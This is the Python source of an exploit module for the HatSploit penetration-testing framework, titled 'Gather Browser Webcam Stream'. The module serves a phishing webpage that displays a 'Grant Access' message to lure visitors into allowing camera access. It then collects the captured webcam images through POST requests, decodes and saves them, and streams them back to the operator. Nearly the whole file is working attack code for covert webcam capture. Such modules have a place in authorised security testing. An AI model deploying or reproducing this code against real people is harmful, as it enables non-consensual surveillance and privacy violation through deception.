"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.loot import Loot
from hatsploit.lib.core.module.basic import *
from hatsploit.lib.core.module.proto import HTTP, Stream

from pex.string import String


class HatSploitModule(Module, HTTP, Stream):
    def __init__(self):
        super().__init__({
            'Category': "exploit",
            'Name': "Gather Browser Webcam Stream",
            'Module': "exploit/generic/gather/browser_webcam_stream",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - module developer",
            ],
            'Description': """
                This module generates a webpage that if accessed tries to send
                built-in camera image to an attacker. Module streams received images
                afterwards.
            """,
            'Platform': OS_GENERIC,
            'Rank': LOW_RANK,
            'References': [
                {'URL': 'https://blog.entysec.com/2022-03-13-webcam-photo-phishing/'}
            ],
            'DisclosureDate': "2022-03-13",
            'Notes': {
                'Stability': [CRASH_SAFE],
                'Reliability': [],
                'SideEffects': [],
            }
        })

        self.loot = Loot()

        self.urlpath = Option('URLPATH', "/", "File path on server.", True)
        self.path = Option('PATH', self.loot.random_loot('png'), "Path to save file.", True)
        self.message = Option('MESSAGE', "Grant Access", "Message to display.", True)

    def __call__(self):
        self.html.set(self.loot.random_loot('html'))

    def run(self):
        def get(request):
            if request.path == self.urlpath.value:
                payload = self.loot.get_data('webcam/index.html')

                payload = payload.replace(
                    b'%MESSAGE%', self.message.value.encode())
                payload = payload.replace(b'%TIMEOUT%', b'0')

                self.print_process("Delivering payload...")

                request.send_status(200)
                request.wfile.write(payload)

        def post(request):
            request.send_status(200)

            try:
                photo_length = int(request.headers['Content-Length'])

                post_data = request.rfile.read(photo_length)
                post_data = post_data.split(b',', 1)[1]

                photo_data = String().base64_decode(post_data, False)
            except Exception:
                return

            self.loot.save_file(self.path.value, photo_data, 'png')

        client = self.open_stream(image=self.path.value)

        client.create_video()
        client.stream()

        self.listen_http(methods={'GET': get, 'POST': post})
